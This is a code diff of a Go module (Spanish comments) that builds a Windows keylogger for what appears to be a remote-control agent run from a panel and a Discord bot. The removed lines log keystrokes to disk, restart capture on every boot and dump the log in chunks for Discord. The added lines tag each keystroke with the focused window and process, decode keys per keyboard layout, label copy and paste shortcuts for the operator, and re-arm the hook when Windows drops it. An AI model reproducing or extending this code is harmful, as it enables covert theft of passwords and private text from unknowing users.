@@ -3,20 +3,17 @@
 package win32
 
 import (
-	"errors"
+	"context"
 	"fmt"
 	"log/slog"
-	"os"
 	"path/filepath"
 	"runtime"
-	"strconv"
+	"strings"
 	"sync"
 	"time"
 	"unicode/utf16"
-	"unicode/utf8"
 	"unsafe"
 
-	"github.com/local/govoid/internal/config"
 	"golang.org/x/sys/windows"
 )
 
@@ -27,44 +24,59 @@ const (
 	wmQuit        = 0x0012
 	hcAction      = 0
 	cfUnicodeText = 13
-)
 
-const (
-	// keylogMaxBytes es el tope del sumidero. Al pasarlo se rota a .1: un
-	// keylog sin límite acaba llenando el disco de la máquina.
-	keylogMaxBytes = 8 << 20
+	// foregroundPoll es el latido que mira qué ventana tiene el foco. Cada
+	// cambio de proceso o de título abre una sesión nueva en el buffer.
+	foregroundPoll = 500 * time.Millisecond
 
-	// keylogFlushBytes y keylogFlushDelay deciden cuándo baja el texto a
-	// disco. Antes cada tecla abría y escribía el archivo: una llamada al
-	// sistema por pulsación dentro del callback del hook. Windows desinstala
-	// un WH_KEYBOARD_LL que tarda más de 300 ms, así que ese diseño se caía
-	// solo en cuanto el disco se ponía lento. Ahora el callback solo acumula
-	// bytes y un escritor dedicado los vuelca en lote.
-	keylogFlushBytes = 512
-	keylogFlushDelay = 400 * time.Millisecond
+	// hookHealth comprueba el hook con menos frecuencia que el foco: montarlo
+	// no es gratis y no hace falta mirarlo cada medio segundo.
+	hookHealth = 3 * time.Second
 
-	// keylogBatchWindow agrupa una ráfaga de tecleo en una sola escritura.
-	keylogBatchWindow = 250 * time.Millisecond
-
-	// keylogMaxPending acota lo acumulado si el disco no responde. Pasado el
-	// tope se descartan teclas nuevas en vez de crecer sin freno.
-	keylogMaxPending = 1 << 20
-
-	// keylogDumpChunk limita un envío a Discord (8 MB por archivo de bot).
-	keylogDumpChunk = 6 << 20
+	vkControl = 0x11
 )
 
 var (
-	procSetWindowsHookExW   = user32.NewProc("SetWindowsHookExW")
-	procUnhookWindowsHookEx = user32.NewProc("UnhookWindowsHookEx")
-	procCallNextHookEx      = user32.NewProc("CallNextHookEx")
-	procGetMessageW         = user32.NewProc("GetMessageW")
-	procTranslateMessage    = user32.NewProc("TranslateMessage")
-	procDispatchMessageW    = user32.NewProc("DispatchMessageW")
-	procPostThreadMessageW  = user32.NewProc("PostThreadMessageW")
-	procGetKeyboardState    = user32.NewProc("GetKeyboardState")
-	procToUnicode           = user32.NewProc("ToUnicode")
+	procSetWindowsHookExW        = user32.NewProc("SetWindowsHookExW")
+	procUnhookWindowsHookEx      = user32.NewProc("UnhookWindowsHookEx")
+	procCallNextHookEx           = user32.NewProc("CallNextHookEx")
+	procGetMessageW              = user32.NewProc("GetMessageW")
+	procTranslateMessage         = user32.NewProc("TranslateMessage")
+	procDispatchMessageW         = user32.NewProc("DispatchMessageW")
+	procPostThreadMessageW       = user32.NewProc("PostThreadMessageW")
+	procGetKeyboardState         = user32.NewProc("GetKeyboardState")
+	procToUnicodeEx              = user32.NewProc("ToUnicodeEx")
+	procGetForegroundWindow      = user32.NewProc("GetForegroundWindow")
+	procGetWindowTextW           = user32.NewProc("GetWindowTextW")
+	procGetWindowThreadProcessID = user32.NewProc("GetWindowThreadProcessId")
+	procGetKeyboardLayout        = user32.NewProc("GetKeyboardLayout")
+	procGetAsyncKeyState         = user32.NewProc("GetAsyncKeyState")
 )
+
+// KeyEvent es una pulsación capturada. IsSpecial marca las teclas que no
+// producen texto; en ese caso el contenido está en Label.
+type KeyEvent struct {
+	Timestamp time.Time
+	Vk        uint32
+	Rune      rune
+	IsSpecial bool
+	Label     string
+}
+
+// WindowSession agrupa lo tecleado mientras una ventana tuvo el foco.
+type WindowSession struct {
+	StartedAt   time.Time
+	ProcessName string
+	WindowTitle string
+	Events      []KeyEvent
+}
+
+// Sink recibe las sesiones y los eventos. La implementa el buffer de comandos;
+// win32 no conoce a quien los guarda.
+type Sink interface {
+	StartSession(process, title string, at time.Time)
+	Append(ev KeyEvent)
+}
 
 type point struct {
 	X int32
@@ -89,27 +101,26 @@ type kbdllHookStruct struct {
 	DwExtraInfo uintptr
 }
 
-// Keylogger mantiene el hook WH_KEYBOARD_LL y vuelca lo tecleado a disco.
-//
-// El sumidero en disco es lo que hace que el registro sobreviva al reinicio del
-// agente; el hook se instala solo al arrancar, así que no hay que encenderlo
-// desde el panel.
+type windowInfo struct {
+	process string
+	title   string
+}
+
+// Keylogger mantiene el hook WH_KEYBOARD_LL y etiqueta cada tecla con la
+// ventana que tenía el foco. El almacenamiento vive fuera: aquí solo se captura
+// y se entrega al Sink.
 type Keylogger struct {
-	mu        sync.Mutex
-	pending   []byte
-	sink      *os.File
-	hook      uintptr
-	threadID  uint32
-	lastFlush time.Time
-	running   bool
-	wanted    bool
-	supervise bool
-	writerOn  bool
-	dropped   uint64
-	writes    uint64
-	done      chan struct{}
-	wake      chan struct{}
-	quit      chan struct{}
+	mu       sync.Mutex
+	sink     Sink
+	hook     uintptr
+	threadID uint32
+	layout   uintptr
+	window   windowInfo
+	running  bool
+	wanted   bool
+	done     chan struct{}
+	cancel   context.CancelFunc
+	wg       sync.WaitGroup
 }
 
 // Default es el keylogger que usa el agente.
@@ -118,8 +129,15 @@ var Default = &Keylogger{}
 // hookProcRef mantiene viva la referencia del callback ante el GC.
 var hookProcRef = windows.NewCallback(keyboardProc)
 
-// keyboardProc corre en el hilo del message loop. No debe bloquear ni tocar el
-// disco: solo acumula, y el escritor baja el lote.
+// SetSink enlaza el buffer que recibe los eventos. Se puede llamar antes o
+// después de Start: el hook lee el sink en cada tecla.
+func (k *Keylogger) SetSink(sink Sink) {
+	k.mu.Lock()
+	k.sink = sink
+	k.mu.Unlock()
+}
+
+// keyboardProc corre en el hilo del message loop. No debe bloquear.
 func keyboardProc(nCode int32, wParam uintptr, lParam uintptr) uintptr {
 	if nCode == hcAction && (wParam == wmKeyDown || wParam == wmSysKeyDown) {
 		kb := (*kbdllHookStruct)(uintptrToPointer(lParam))
@@ -129,202 +147,141 @@ func keyboardProc(nCode int32, wParam uintptr, lParam uintptr) uintptr {
 	return res
 }
 
-// record decodifica la tecla y la suma al lote pendiente. Sin asignaciones
-// grandes, sin llamadas al sistema de archivos.
+// record traduce la tecla y la entrega al buffer, ya marcada con su etiqueta.
 func (k *Keylogger) record(kb *kbdllHookStruct) {
 	k.mu.Lock()
-	if len(k.pending) >= keylogMaxPending {
-		k.dropped++
-		k.mu.Unlock()
+	sink := k.sink
+	k.mu.Unlock()
+	if sink == nil {
 		return
 	}
-	k.pending = appendKeyText(k.pending, kb)
-	flush := len(k.pending) >= keylogFlushBytes || time.Since(k.lastFlush) >= keylogFlushDelay
-	k.mu.Unlock()
-	if flush {
-		k.signal()
+
+	event := KeyEvent{Timestamp: time.Now().UTC(), Vk: kb.VkCode}
+
+	if ctrlDown() {
+		if label, ok := ctrlLabel(kb.VkCode); ok {
+			event.IsSpecial = true
+			event.Label = label
+			sink.Append(event)
+			return
+		}
 	}
+
+	if label, ok := specialLabel(kb.VkCode); ok {
+		event.IsSpecial = true
+		event.Label = label
+		sink.Append(event)
+		return
+	}
+
+	// Shift, Alt y Ctrl sueltos no son texto: marcarlos llenaría el dump de
+	// [VK:0x10] entre cada mayúscula. Se usan para construir las etiquetas.
+	if isModifierKey(kb.VkCode) {
+		return
+	}
+
+	if r, ok := k.decode(kb); ok && r != 0 {
+		event.Rune = r
+		sink.Append(event)
+		return
+	}
+
+	event.IsSpecial = true
+	event.Label = fmt.Sprintf("[VK:0x%02X]", kb.VkCode)
+	sink.Append(event)
 }
 
-// signal despierta al escritor sin bloquear al hook. El canal tiene hueco para
-// una señal: varias teclas seguidas se agrupan en una sola llamada.
-func (k *Keylogger) signal() {
-	select {
-	case k.wake <- struct{}{}:
-	default:
-	}
-}
-
-// appendKeyText traduce la tecla a UTF-8 sobre el buffer dado.
-func appendKeyText(dst []byte, kb *kbdllHookStruct) []byte {
-	switch kb.VkCode {
-	case 0x0D:
-		return append(dst, '\n')
-	case 0x20:
-		return append(dst, ' ')
-	}
-
-	if special, ok := specialKey(kb.VkCode); ok {
-		return append(dst, special...)
-	}
-
+// decode convierte la tecla a rune con ToUnicodeEx y el layout de la ventana en
+// foco: la misma posición de tecla da 'ñ' en español y 'z' en alemán.
+func (k *Keylogger) decode(kb *kbdllHookStruct) (rune, bool) {
 	var state [256]byte
 	if res, _, _ := procGetKeyboardState.Call(uintptr(unsafe.Pointer(&state[0]))); res == 0 {
-		return dst
+		return 0, false
 	}
 
+	k.mu.Lock()
+	layout := k.layout
+	k.mu.Unlock()
+
 	var buf [8]uint16
-	n, _, _ := procToUnicode.Call(
+	n, _, _ := procToUnicodeEx.Call(
 		uintptr(kb.VkCode),
 		uintptr(kb.ScanCode),
 		uintptr(unsafe.Pointer(&state[0])),
 		uintptr(unsafe.Pointer(&buf[0])),
 		uintptr(len(buf)),
 		0,
+		layout,
 	)
 	if int32(n) <= 0 {
-		return dst
+		return 0, false
 	}
 
-	for i := 0; i < int(n); i++ {
-		r := rune(buf[i])
-		if utf16.IsSurrogate(r) && i+1 < int(n) {
-			if pair := utf16.DecodeRune(r, rune(buf[i+1])); pair != utf8.RuneError {
-				dst = utf8.AppendRune(dst, pair)
-				i++
-				continue
-			}
-		}
-		dst = utf8.AppendRune(dst, r)
+	r := rune(buf[0])
+	if utf16.IsSurrogate(r) && int(n) > 1 {
+		r = utf16.DecodeRune(r, rune(buf[1]))
 	}
-	return dst
+	return r, true
 }
 
-// specialKey devuelve la marca de las teclas que no producen texto.
-func specialKey(vk uint32) (string, bool) {
+// ctrlDown pregunta por el estado real del modificador en este instante.
+func ctrlDown() bool {
+	res, _, _ := procGetAsyncKeyState.Call(vkControl)
+	return int32(res)&0x8000 != 0
+}
+
+// ctrlLabel cubre los atajos que interesan al operador.
+func ctrlLabel(vk uint32) (string, bool) {
 	switch vk {
-	case 0x08:
-		return "[BKSP]", true
-	case 0x09:
-		return "[TAB]", true
-	case 0x1B:
-		return "[ESC]", true
-	case 0x25:
-		return "[LEFT]", true
-	case 0x26:
-		return "[UP]", true
-	case 0x27:
-		return "[RIGHT]", true
-	case 0x28:
-		return "[DOWN]", true
-	case 0x2E:
-		return "[DEL]", true
-	case 0x24:
-		return "[HOME]", true
-	case 0x23:
-		return "[END]", true
-	case 0x21:
-		return "[PGUP]", true
-	case 0x22:
-		return "[PGDN]", true
+	case 0x43:
+		return "[CTRL+C]", true
+	case 0x56:
+		return "[CTRL+V]", true
+	case 0x58:
+		return "[CTRL+X]", true
+	case 0x41:
+		return "[CTRL+A]", true
+	case 0x5A:
+		return "[CTRL+Z]", true
+	case 0x53:
+		return "[CTRL+S]", true
 	}
 	return "", false
 }
 
-// keylogSinkPath vive en ProgramData, junto al diario del agente: sobrevive a
-// reinicios y a la reinstalación del binario.
-func keylogSinkPath() string {
-	return filepath.Join(config.StateDir(), "keylog.txt")
+// specialLabel mapea las teclas que nunca producen texto.
+func specialLabel(vk uint32) (string, bool) {
+	switch vk {
+	case 0x0D:
+		return "[ENTER]", true
+	case 0x09:
+		return "[TAB]", true
+	case 0x08:
+		return "[BKSP]", true
+	case 0x2E:
+		return "[DEL]", true
+	case 0x1B:
+		return "[ESC]", true
+	case 0x5B, 0x5C:
+		return "[WIN]", true
+	}
+	if vk >= 0x70 && vk <= 0x7B {
+		return fmt.Sprintf("[F%d]", vk-0x6F), true
+	}
+	return "", false
 }
 
-// keylogPosPath guarda hasta dónde se envió el último dump confirmado.
-func keylogPosPath() string {
-	return filepath.Join(config.StateDir(), "keylog.pos")
+func isModifierKey(vk uint32) bool {
+	switch vk {
+	case 0x10, 0x11, 0x12, // Shift, Control, Alt
+		0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, // izquierdas y derechas
+		0x14: // CapsLock: cambia el estado, no escribe
+		return true
+	}
+	return false
 }
 
-// writeLocked vuelca el lote pendiente. Si algo falla el lote se queda en
-// memoria y se reintenta en el siguiente volcado: no se pierde nada.
-func (k *Keylogger) writeLocked() {
-	if len(k.pending) == 0 {
-		return
-	}
-
-	path := keylogSinkPath()
-	if k.sink == nil {
-		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
-			return
-		}
-		if info, err := os.Stat(path); err == nil && info.Size() >= keylogMaxBytes {
-			_ = os.Rename(path, path+".1")
-		}
-		file, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o644)
-		if err != nil {
-			return
-		}
-		k.sink = file
-	}
-
-	if _, err := k.sink.Write(k.pending); err != nil {
-		_ = k.sink.Close()
-		k.sink = nil
-		return
-	}
-	k.pending = k.pending[:0]
-	k.writes++
-}
-
-// flush baja el lote a disco. Se llama desde el escritor y antes de un dump.
-func (k *Keylogger) flush() {
-	k.mu.Lock()
-	k.writeLocked()
-	dropped := k.dropped
-	k.dropped = 0
-	k.lastFlush = time.Now()
-	k.mu.Unlock()
-
-	if dropped > 0 {
-		slog.Debug("keylogger: lote descartado por tope", "teclas", dropped)
-	}
-}
-
-// startWriter lanza el escritor dedicado una sola vez.
-func (k *Keylogger) startWriter() {
-	k.mu.Lock()
-	if k.writerOn {
-		k.mu.Unlock()
-		return
-	}
-	k.writerOn = true
-	k.wake = make(chan struct{}, 1)
-	k.quit = make(chan struct{})
-	wake, quit := k.wake, k.quit
-	k.mu.Unlock()
-
-	go func() {
-		for {
-			select {
-			case <-quit:
-				k.flush()
-				return
-			case <-wake:
-			}
-
-			// Ventana de agrupación: lo tecleado en ráfaga entra en una sola
-			// escritura en vez de una por pulsación.
-			timer := time.NewTimer(keylogBatchWindow)
-			select {
-			case <-timer.C:
-			case <-quit:
-				timer.Stop()
-				k.flush()
-				return
-			}
-			k.flush()
-		}
-	}()
-}
-
-// Start instala el hook en un hilo propio con su message loop.
+// Start instala el hook y el vigilante de ventana. Si ya está activo es no-op.
 func (k *Keylogger) Start() error {
 	k.mu.Lock()
 	if k.running {
@@ -333,30 +290,156 @@ func (k *Keylogger) Start() error {
 		return nil
 	}
 	k.wanted = true
+	ctx, cancel := context.WithCancel(context.Background())
+	k.cancel = cancel
 	k.mu.Unlock()
 
-	k.startWriter()
-	k.superviseLoop()
+	k.wg.Add(1)
+	go func() {
+		defer k.wg.Done()
+		k.watch(ctx)
+	}()
+
 	return k.install()
 }
 
-// AutoStart enciende la captura en el arranque del proceso, sin esperar ningún
-// comando: el hook queda montado antes de instalar la persistencia o conectar
-// el bot. Un stop del panel dura lo que dure este proceso; el siguiente
-// arranque vuelve a capturar, que es lo que se espera de un agente desplegado.
-func (k *Keylogger) AutoStart() {
+// Stop desinstala el hook y para el vigilante. No toca el buffer: lo que esté
+// capturado sigue disponible para el próximo dump.
+func (k *Keylogger) Stop() {
 	k.mu.Lock()
-	k.wanted = true
+	k.wanted = false
+	cancel := k.cancel
+	k.cancel = nil
+	running, tid, done := k.running, k.threadID, k.done
 	k.mu.Unlock()
 
-	k.startWriter()
-	k.superviseLoop()
+	if cancel != nil {
+		cancel()
+	}
 
-	if err := k.install(); err != nil {
-		slog.Debug("keylogger: no se pudo instalar al arrancar, se reintenta", "err", err)
+	if running && done != nil {
+		procPostThreadMessageW.Call(uintptr(tid), wmQuit, 0, 0)
+		select {
+		case <-done:
+		case <-time.After(2 * time.Second):
+			slog.Debug("keylogger: el message loop no cerró a tiempo")
+		}
+	}
+
+	// El vigilante sale solo al cancelar el contexto; se espera para no dejar
+	// una goroutine viva por cada start/stop del panel.
+	waited := make(chan struct{})
+	go func() {
+		k.wg.Wait()
+		close(waited)
+	}()
+	select {
+	case <-waited:
+	case <-time.After(time.Second):
+		slog.Debug("keylogger: el vigilante no cerró a tiempo")
+	}
+}
+
+// Running informa si el hook está activo.
+func (k *Keylogger) Running() bool {
+	k.mu.Lock()
+	defer k.mu.Unlock()
+	return k.running
+}
+
+// watch hace dos cosas con un solo reloj: sigue la ventana en foco y rearma el
+// hook si Windows lo retiró.
+func (k *Keylogger) watch(ctx context.Context) {
+	ticker := time.NewTicker(foregroundPoll)
+	defer ticker.Stop()
+
+	lastHealth := time.Time{}
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		case <-ticker.C:
+		}
+
+		k.syncForeground()
+
+		if time.Since(lastHealth) < hookHealth {
+			continue
+		}
+		lastHealth = time.Now()
+
+		k.mu.Lock()
+		wanted, running := k.wanted, k.running
+		k.mu.Unlock()
+		if wanted && !running {
+			if err := k.install(); err != nil {
+				slog.Debug("keylogger: rearme fallido", "err", err)
+			}
+		}
+	}
+}
+
+// syncForeground lee la ventana activa y abre sesión cuando cambia. También
+// refresca el layout del teclado que usa ToUnicodeEx.
+func (k *Keylogger) syncForeground() {
+	hwnd, _, _ := procGetForegroundWindow.Call()
+	if hwnd == 0 {
 		return
 	}
-	slog.Info("keylogger: captura activa desde el arranque", "sumidero", keylogSinkPath())
+
+	var titleBuf [512]uint16
+	var title string
+	if n, _, _ := procGetWindowTextW.Call(
+		hwnd,
+		uintptr(unsafe.Pointer(&titleBuf[0])),
+		uintptr(len(titleBuf)),
+	); n > 0 && int(n) <= len(titleBuf) {
+		title = string(utf16.Decode(titleBuf[:n]))
+	}
+
+	var pid uint32
+	threadID, _, _ := procGetWindowThreadProcessID.Call(
+		hwnd, uintptr(unsafe.Pointer(&pid)))
+
+	process := ""
+	if handle, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid); err == nil {
+		var path [windows.MAX_LONG_PATH]uint16
+		size := uint32(len(path))
+		if qerr := windows.QueryFullProcessImageName(handle, 0, &path[0], &size); qerr == nil && size > 0 {
+			process = filepath.Base(windows.UTF16ToString(path[:size]))
+		}
+		_ = windows.CloseHandle(handle)
+	}
+
+	var layout uintptr
+	if threadID != 0 {
+		layout, _, _ = procGetKeyboardLayout.Call(threadID)
+	}
+
+	if process == "" && title == "" {
+		return
+	}
+
+	k.mu.Lock()
+	k.layout = layout
+	changed := process != k.window.process || !sameWindowTitle(title, k.window.title)
+	k.window = windowInfo{process: process, title: title}
+	sink := k.sink
+	k.mu.Unlock()
+
+	if changed && sink != nil {
+		sink.StartSession(process, title, time.Now().UTC())
+	}
+}
+
+// sameWindowTitle compara títulos ignorando el asterisco de "sin guardar" que
+// Notepad y otros ponen al primer carácter. Sin esto, escribir en un documento
+// nuevo partía la sesión en dos mitades.
+func sameWindowTitle(a, b string) bool {
+	if a == b {
+		return true
+	}
+	return strings.TrimPrefix(a, "*") == strings.TrimPrefix(b, "*")
 }
 
 // install monta el hook y corre el message loop hasta que alguien pide parar.
@@ -411,145 +494,3 @@ func (k *Keylogger) install() error {
 
 	return <-ready
 }
-
-// superviseLoop vigila el hook. Windows puede retirarlo si otro hook de la
-// cadena se atasca; sin esto la captura se quedaba muerta hasta el próximo
-// arranque del agente.
-func (k *Keylogger) superviseLoop() {
-	k.mu.Lock()
-	if k.supervise {
-		k.mu.Unlock()
-		return
-	}
-	k.supervise = true
-	k.mu.Unlock()
-
-	go func() {
-		ticker := time.NewTicker(3 * time.Second)
-		defer ticker.Stop()
-		for range ticker.C {
-			k.mu.Lock()
-			wanted, running := k.wanted, k.running
-			k.mu.Unlock()
-			if !wanted || running {
-				continue
-			}
-			if err := k.install(); err != nil {
-				slog.Debug("keylogger: rearme fallido", "err", err)
-			}
-		}
-	}()
-}
-
-// Stop desinstala el hook en este proceso. El próximo arranque del agente
-// vuelve a montarlo: la captura no depende de que nadie la encienda.
-func (k *Keylogger) Stop() {
-	k.mu.Lock()
-	k.wanted = false
-	running, tid, done := k.running, k.threadID, k.done
-	k.mu.Unlock()
-
-	if running && done != nil {
-		procPostThreadMessageW.Call(uintptr(tid), wmQuit, 0, 0)
-		select {
-		case <-done:
-		case <-time.After(2 * time.Second):
-			slog.Debug("keylogger: el message loop no cerró a tiempo")
-		}
-	}
-	k.flush()
-}
-
-// Running informa si el hook está activo.
-func (k *Keylogger) Running() bool {
-	k.mu.Lock()
-	defer k.mu.Unlock()
-	return k.running
-}
-
-// Dump devuelve lo capturado desde el último envío confirmado y el
-// desplazamiento con el que hay que llamar a Commit cuando el archivo salga.
-// Con -1 no se confirma nada: el texto se quedó en memoria y hay que reintentar.
-func (k *Keylogger) Dump() (string, int64) {
-	k.flush()
-
-	k.mu.Lock()
-	pending := append([]byte(nil), k.pending...)
-	k.mu.Unlock()
-
-	raw, err := os.ReadFile(keylogSinkPath())
-	if err != nil {
-		if len(pending) == 0 {
-			return "", -1
-		}
-		return string(pending), -1
-	}
-
-	offset := readKeylogOffset()
-	if offset < 0 || offset > int64(len(raw)) {
-		offset = 0
-	}
-	chunk := raw[offset:]
-	if len(chunk) > keylogDumpChunk {
-		chunk = chunk[:keylogDumpChunk]
-	}
-	if len(chunk) == 0 && len(pending) == 0 {
-		return "", offset
-	}
-	if len(pending) > 0 {
-		return string(chunk) + string(pending), -1
-	}
-	return string(chunk), offset + int64(len(chunk))
-}
-
-// Commit marca como enviado lo que salió en el dump.
-func (k *Keylogger) Commit(offset int64) {
-	if offset < 0 {
-		return
-	}
-	path := keylogPosPath()
-	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
-		return
-	}
-	if err := os.WriteFile(path, []byte(strconv.FormatInt(offset, 10)), 0o644); err != nil {
-		slog.Debug("keylogger: no se pudo guardar el puntero del dump", "err", err)
-	}
-}
-
-func readKeylogOffset() int64 {
-	raw, err := os.ReadFile(keylogPosPath())
-	if err != nil {
-		return 0
-	}
-	offset, err := strconv.ParseInt(string(trimSpaceBytes(raw)), 10, 64)
-	if err != nil || offset < 0 {
-		return 0
-	}
-	return offset
-}
-
-func trimSpaceBytes(raw []byte) []byte {
-	start, end := 0, len(raw)
-	for start < end && (raw[start] == ' ' || raw[start] == '\n' || raw[start] == '\r' || raw[start] == '\t') {
-		start++
-	}
-	for end > start && (raw[end-1] == ' ' || raw[end-1] == '\n' || raw[end-1] == '\r' || raw[end-1] == '\t') {
-		end--
-	}
-	return raw[start:end]
-}
-
-// Close suelta el sumidero tras volcar lo pendiente. Sin esto el archivo queda
-// abierto hasta que el proceso muere.
-func (k *Keylogger) Close() {
-	k.flush()
-	k.mu.Lock()
-	if k.sink != nil {
-		_ = k.sink.Close()
-		k.sink = nil
-	}
-	k.mu.Unlock()
-}
-
-// ErrNotRunning se devuelve cuando se pide parar un keylogger inactivo.
-var ErrNotRunning = errors.New("keylogger: no está corriendo")
